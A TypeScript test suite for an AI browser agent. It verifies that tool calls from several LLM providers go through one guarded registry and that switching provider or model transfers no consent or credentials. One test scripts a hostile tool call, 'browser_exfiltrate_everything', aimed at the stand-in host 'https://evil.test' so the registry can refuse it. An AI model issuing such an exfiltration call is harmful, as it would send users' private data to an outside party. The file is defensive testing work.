/**
 * TEST-PROVIDER-006 — cross-provider tool execution and provider switching
 * (Stage 3 Wave C, specification section 60 / P-033).
 *
 * Two claims are made here that no unit test can make.
 *
 * The first is that a tool call is a tool call whichever provider produced
 * it. Three wire formats express one intent three ways, and all three have to
 * arrive at the *same* `ToolRegistry` — the one with schema validation, risk
 * classification, policy, permission and evidence behind it. A provider that
 * reached a shorter path would be a way to run a tool without being asked,
 * and the way to know none of them does is to run the real registry behind
 * each of them.
 *
 * The second is that switching provider carries nothing with it. The
 * conversation may transfer; authentication, consent and the provider pin
 * must not. A task that was authorised to talk to one endpoint is not
 * thereby authorised to talk to another.
 */
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { AgentRuntime, type RuntimeCallbacks } from '@/agent/runtime/agent-runtime';
import { ProviderRegistry } from '@/providers/registry/provider-registry';
import { createBrowserTools } from '@/tools/browser/browser-tools';
import { createTask, type AgentTask } from '@/tasks/task-model';
import { ConsentStore } from '@/security/egress/consent';
import { createGuardedTransport, type EgressContext } from '@/security/egress/provider-transport';
import { addTaint, freshTaint } from '@/security/taint/taint-state';
import { providerDestination } from '@/security/egress/destination';
import { ProviderRequestError } from '@/providers/core/provider-error';
import type { TaintSource } from '@/security/exfiltration/exfiltration-guard';
import type { AIProviderAdapter, ModelCapabilities } from '@/providers/core/types';
import { FakeBrowserAdapter } from '../fixtures/fake-browser';
import { fakeDebugger } from '../fixtures/fake-debugger';
import { createHarness, ScriptedPrompter, type Harness } from '../fixtures/policy-harness';
import { FULL_CAPABILITIES } from '../fixtures/fake-provider';
import {
  API_PROVIDER_CASES,
  API_PROVIDER_PACKS,
  type ProviderWirePack,
} from '../fixtures/provider-wire';
import type { SemanticPage } from '@/content/semantic-tree';

const page: SemanticPage = {
  url: 'https://example.com/',
  title: 'Example Domain',
  generation: 1,
  capturedAt: 1000,
  readyState: 'complete',
  text: 'This domain is for use in illustrative examples.',
  textTruncated: false,
  elements: [
    {
      elementId: 'e1-0',
      role: 'link',
      name: 'More information',
      visible: true,
      enabled: true,
      selectorHints: ['#more'],
      frameId: 'main',
    },
  ],
  elementsTruncated: false,
  scrollY: 0,
  documentHeight: 600,
  viewportHeight: 600,
};

const privatePage: TaintSource = {
  sourceType: 'web_page',
  site: 'intranet.example',
  sensitivity: 'confidential',
};

const CAPABILITIES: ModelCapabilities = { ...FULL_CAPABILITIES };

interface Recorder {
  readonly callbacks: RuntimeCallbacks;
  readonly tools: string[];
}

function recorder(): Recorder {
  const tools: string[] = [];
  return {
    tools,
    callbacks: {
      onStateChange: () => Promise.resolve(),
      onComplete: () => Promise.resolve(),
      onStep: (_id, step) => {
        if (step.tool) tools.push(step.tool);
        return Promise.resolve();
      },
      onActivity: () => undefined,
      onUsage: () => Promise.resolve(),
      onEvidence: () => Promise.resolve(),
      persistTaint: async () => ({ kind: 'KNOWN_UNTAINTED' }) as const,
      recoverSalt: async () => ({ salt: 'ab'.repeat(32), epoch: 1 }),
    },
  };
}

function makeTask(pack: ProviderWirePack, overrides: Partial<AgentTask> = {}): AgentTask {
  return {
    ...createTask({
      id: 'task_switch',
      sessionId: 's1',
      objective: 'Read the current page and summarise it.',
      providerId: pack.factory.id,
      modelId: pack.config.model ?? '',
      permissionMode: 'auto',
      now: 1000,
    }),
    ...overrides,
  };
}

/**
 * Builds a real adapter over a scripted endpoint.
 *
 * The transport is the production guarded one, so every assertion below about
 * what did or did not reach the network is an assertion about the real gate
 * rather than about a stub that agreed to be called.
 */
async function liveAdapter(
  pack: ProviderWirePack,
  consent: ConsentStore,
  script: () => Response,
): Promise<{ adapter: AIProviderAdapter; reached: string[] }> {
  const reached: string[] = [];
  const transport = createGuardedTransport({
    consent,
    fetchImpl: ((url: string, init: RequestInit) => {
      reached.push(url);
      return Promise.resolve(pack.route(url, init, script));
    }) as unknown as typeof fetch,
  });
  const registry = new ProviderRegistry({ transport });
  registry.register(pack.factory);
  const adapter = registry.get(pack.factory.id);
  await adapter.connect(pack.config);
  return { adapter, reached };
}

function egressFor(pack: ProviderWirePack, overrides: Partial<EgressContext> = {}): EgressContext {
  return {
    taskId: 'task_switch',
    taintState: freshTaint(),
    taintSalt: 'ab'.repeat(32),
    saltEpoch: 1,
    taintSignature: 'sig',
    providerId: pack.factory.id,
    modelId: pack.config.model ?? '',
    ...overrides,
  };
}

let browser: FakeBrowserAdapter;
let harness: Harness;
let consent: ConsentStore;

beforeEach(() => {
  browser = new FakeBrowserAdapter();
  browser.addTab({ id: 1, url: 'https://example.com/', title: 'Example Domain', active: true });
  browser.onContent((type) => {
    if (type === 'content.readPage') return { page };
    if (type === 'content.click') return { clicked: true, navigated: false };
    return {};
  });
  harness = createHarness(
    createBrowserTools({ adapter: browser, debuggerManager: fakeDebugger().manager }),
    { prompter: new ScriptedPrompter({ kind: 'approve_once' }) },
  );
  consent = new ConsentStore();
});

describe.each(API_PROVIDER_CASES)('%s reaches the shared tool pipeline', (_id, pack) => {
  it('runs a tool call it produced through the real registry, policy and permission', async () => {
    // Turn one asks for the page; turn two answers in text. Both come out of
    // this provider's own wire format.
    let turn = 0;
    const { adapter } = await liveAdapter(pack, consent, () => {
      turn += 1;
      return turn === 1
        ? pack.toolCall('browser_read_page', {})
        : pack.text('The page is reserved for documentation.');
    });

    const rec = recorder();
    const output = await new AgentRuntime({
      registry: harness.registry,
      callbacks: rec.callbacks,
    }).run({
      task: makeTask(pack),
      provider: adapter,
      capabilities: CAPABILITIES,
      signal: new AbortController().signal,
      tabId: 1,
    });

    expect(output.result.outcome).toBe('COMPLETED');
    // The canonical tool name, resolved through the registry rather than
    // executed by the adapter.
    expect(output.result.completedActions).toContain('browser.read_page');
    expect(rec.tools).toContain('browser.read_page');
    expect(output.result.evidenceIds.length).toBeGreaterThan(0);
  });

  it('routes an unknown tool name to the registry’s refusal, not to the browser', async () => {
    // Model output is not authorisation. A name the registry does not know
    // has to be refused there, whichever provider invented it.
    let turn = 0;
    const { adapter } = await liveAdapter(pack, consent, () => {
      turn += 1;
      return turn === 1
        ? pack.toolCall('browser_exfiltrate_everything', { to: 'https://evil.test' })
        : pack.text('I could not do that.');
    });

    const rec = recorder();
    const output = await new AgentRuntime({
      registry: harness.registry,
      callbacks: rec.callbacks,
    }).run({
      task: makeTask(pack),
      provider: adapter,
      capabilities: CAPABILITIES,
      signal: new AbortController().signal,
      tabId: 1,
    });

    expect(output.result.completedActions).not.toContain('browser.exfiltrate_everything');
    // Nothing reached the page: the refusal happened in the registry, not
    // after the browser had already been asked to act.
    expect(browser.calls).toEqual([]);
  });
});

describe('switching provider carries nothing with it', () => {
  const [openai, anthropic, gemini] = API_PROVIDER_PACKS as unknown as [
    ProviderWirePack,
    ProviderWirePack,
    ProviderWirePack,
  ];

  // Every ordered pair the instruction names, and the reverse paths.
  const routes: [ProviderWirePack, ProviderWirePack][] = [
    [openai, anthropic],
    [anthropic, gemini],
    [gemini, openai],
    [anthropic, openai],
    [gemini, anthropic],
    [openai, gemini],
  ];

  it.each(routes.map(([from, to]) => [from.factory.id, to.factory.id, from, to] as const))(
    '%s → %s does not inherit the previous authorization',
    async (_fromId, _toId, from, to) => {
      const tainted = addTaint(freshTaint(), [privatePage]);

      // The first provider runs and is pinned to this task by doing so.
      const first = await liveAdapter(from, consent, () => from.text('ok'));
      await first.adapter.generate({
        systemInstruction: 's',
        messages: [],
        egress: egressFor(from, { taintState: tainted }),
      });
      expect(first.reached.length).toBeGreaterThan(0);

      // The second provider, same task, same taint. The pin binds a canonical
      // destination, and this is a different one.
      const second = await liveAdapter(to, consent, () => to.text('ok'));
      await expect(
        second.adapter.generate({
          systemInstruction: 's',
          messages: [],
          egress: egressFor(to, { taintState: tainted }),
        }),
      ).rejects.toSatisfy(
        (error: unknown) =>
          error instanceof ProviderRequestError && error.category === 'transport_blocked',
      );
      // No generation request was sent. A provider may still make its own
      // housekeeping calls — a model lookup carries no task data and is
      // authorised on its own terms — but the task's traffic did not move.
      expect(second.reached.filter((url) => url.includes(to.generateFragment))).toEqual([]);
    },
  );

  it.each(API_PROVIDER_CASES)('%s loses its pin when the model changes', async (_id, pack) => {
    const tainted = addTaint(freshTaint(), [privatePage]);
    const { adapter, reached } = await liveAdapter(pack, consent, () => pack.text('ok'));

    await adapter.generate({
      systemInstruction: 's',
      messages: [],
      egress: egressFor(pack, { taintState: tainted }),
    });
    const before = reached.length;

    await expect(
      adapter.generate({
        systemInstruction: 's',
        messages: [],
        egress: egressFor(pack, { taintState: tainted, modelId: 'a-different-model' }),
      }),
    ).rejects.toThrow();
    expect(reached.length).toBe(before);
  });

  it('gives each provider a distinct canonical destination', () => {
    // The property the pin rests on: two providers can never collide on one
    // identity, so a grant for one is never a grant for the other.
    const identities = API_PROVIDER_PACKS.map((pack) => {
      const url = pack.config.baseUrl ?? pack.factory.baseUrl.defaultUrl ?? '';
      return providerDestination(pack.factory.id, url, pack.config.model).identity;
    });
    expect(new Set(identities).size).toBe(identities.length);
    expect(identities.every((identity) => identity !== null)).toBe(true);
  });

  it('does not let a scheme or port change reuse a grant', () => {
    const a = providerDestination('anthropic', 'https://api.anthropic.test', 'm').identity;
    const b = providerDestination('anthropic', 'https://api.anthropic.test:8443', 'm').identity;
    expect(a).not.toBe(b);
  });

  it('keeps authentication per provider rather than per task', async () => {
    // Disconnecting one adapter must not leave another usable on its
    // credentials, and connecting one must not authenticate the others.
    const registry = new ProviderRegistry({
      transport: { request: () => Promise.resolve(new Response('{}', { status: 200 })) },
    });
    for (const pack of API_PROVIDER_PACKS) registry.register(pack.factory);

    const anthropicAdapter = registry.get('anthropic');
    await anthropicAdapter.connect(anthropic.config);
    const geminiAdapter = registry.get('gemini');

    // Never connected, so it has no configuration to fall back on.
    await expect(geminiAdapter.listModels()).rejects.toThrow(/not connected/);

    await anthropicAdapter.disconnect();
    await expect(anthropicAdapter.listModels()).rejects.toThrow(/not connected/);
  });

  it('switches the active provider only to a registered one', () => {
    const registry = new ProviderRegistry({
      transport: { request: () => Promise.resolve(new Response('{}')) },
    });
    for (const pack of API_PROVIDER_PACKS) registry.register(pack.factory);

    registry.setActive('anthropic');
    expect(registry.getActiveId()).toBe('anthropic');
    registry.setActive('gemini');
    expect(registry.getActiveId()).toBe('gemini');
    // No silent fallback: an unregistered id is an error, not a default.
    expect(() => registry.setActive('not-a-provider')).toThrow(/not registered/);
    expect(registry.getActiveId()).toBe('gemini');
  });
});

describe('conversation context transfers, credentials and consent do not', () => {
  it('re-expresses the same canonical conversation in each provider’s shape', async () => {
    // The canonical messages are identical; what reaches each endpoint is
    // not, and that is the separation the adapter layer exists to keep.
    const conversation = {
      systemInstruction: 'SHARED-SYSTEM',
      messages: [
        { role: 'user' as const, content: [{ type: 'text' as const, text: 'click it' }] },
        {
          role: 'assistant' as const,
          content: [
            {
              type: 'tool_call' as const,
              toolCallId: 'call_1',
              name: 'browser_click',
              arguments: { elementId: 'e1' },
            },
          ],
        },
        {
          role: 'tool' as const,
          content: [
            {
              type: 'tool_result' as const,
              toolCallId: 'call_1',
              name: 'browser_click',
              content: '{"clicked":true}',
              isError: false,
            },
          ],
        },
      ],
    };

    for (const pack of API_PROVIDER_PACKS) {
      const bodies: Record<string, unknown>[] = [];
      const transport = {
        request: (url: string, init: RequestInit) => {
          if (typeof init.body === 'string') {
            bodies.push(JSON.parse(init.body) as Record<string, unknown>);
          }
          return Promise.resolve(pack.route(url, init, () => pack.text('ok')));
        },
      };
      const registry = new ProviderRegistry({ transport });
      registry.register(pack.factory);
      const adapter = registry.get(pack.factory.id);
      await adapter.connect(pack.config);

      await adapter.generate({ ...conversation, egress: egressFor(pack) });

      const body = bodies.at(-1)!;
      expect(pack.inspect.systemInstruction(body), pack.factory.id).toBe('SHARED-SYSTEM');
      expect(pack.inspect.assistantToolCalls(body), pack.factory.id).toEqual([
        { name: 'browser_click' },
      ]);
      expect(pack.inspect.toolResults(body).join(''), pack.factory.id).toContain('true');
      // The key never travels in the conversation.
      expect(JSON.stringify(body)).not.toContain(pack.config.apiKey);
    }
  });

  it('does not let one provider’s credential reach another', async () => {
    const seen: { provider: string; headers: Record<string, string> }[] = [];
    const registry = new ProviderRegistry({
      transport: {
        request: (url, init) => {
          seen.push({ provider: url, headers: init.headers as Record<string, string> });
          return Promise.resolve(new Response('{}', { status: 200 }));
        },
      },
    });
    for (const pack of API_PROVIDER_PACKS) registry.register(pack.factory);

    for (const pack of API_PROVIDER_PACKS) {
      const adapter = registry.get(pack.factory.id);
      await adapter.connect(pack.config);
      await adapter.listModels();
    }

    for (const call of seen) {
      const values = Object.values(call.headers).join(' ');
      const others = API_PROVIDER_PACKS.filter(
        (pack) =>
          !call.provider.includes(
            new URL(pack.config.baseUrl ?? pack.factory.baseUrl.defaultUrl!).host,
          ),
      );
      for (const other of others) {
        expect(values).not.toContain(other.config.apiKey);
      }
    }
  });
});

describe('a provider cannot be registered twice or reached before it exists', () => {
  it('refuses a duplicate registration', () => {
    const registry = new ProviderRegistry({
      transport: { request: () => Promise.resolve(new Response('{}')) },
    });
    registry.register(API_PROVIDER_PACKS[0]!.factory);
    expect(() => registry.register(API_PROVIDER_PACKS[0]!.factory)).toThrow(/already registered/);
  });

  it('refuses to build an adapter for an unregistered id', () => {
    const registry = new ProviderRegistry({
      transport: { request: () => Promise.resolve(new Response('{}')) },
    });
    expect(() => registry.get('gemini')).toThrow(/not registered/);
  });

  it('registers every API provider the product ships', () => {
    const registry = new ProviderRegistry({
      transport: { request: () => Promise.resolve(new Response('{}')) },
    });
    for (const pack of API_PROVIDER_PACKS) registry.register(pack.factory);
    expect(
      registry
        .list()
        .map((f) => f.id)
        .sort(),
    ).toEqual(['anthropic', 'gemini', 'openai-compatible']);
    // Web providers are foundation only: none is registered, so none is
    // selectable, so no web inference can be reached from here.
    expect(registry.list().every((f) => f.kind === 'api')).toBe(true);
  });
});

describe('vision stays on the same guarded path', () => {
  it.each(API_PROVIDER_CASES)('%s sends an image through the transport', async (_id, pack) => {
    const forbidden = vi.fn(() => {
      throw new Error('the network was reached without authorization');
    });
    vi.stubGlobal('fetch', forbidden);
    try {
      const { adapter, reached } = await liveAdapter(pack, consent, () => pack.text('seen'));
      await adapter.generate({
        systemInstruction: '',
        messages: [
          {
            role: 'user',
            content: [{ type: 'image', data: 'QUFBQQ==', mimeType: 'image/png' }],
          },
        ],
        egress: egressFor(pack),
      });
      // No separate route for image traffic: the same endpoint, the same gate.
      expect(reached.some((url) => url.includes(pack.generateFragment))).toBe(true);
      expect(forbidden).not.toHaveBeenCalled();
    } finally {
      vi.unstubAllGlobals();
    }
  });
});
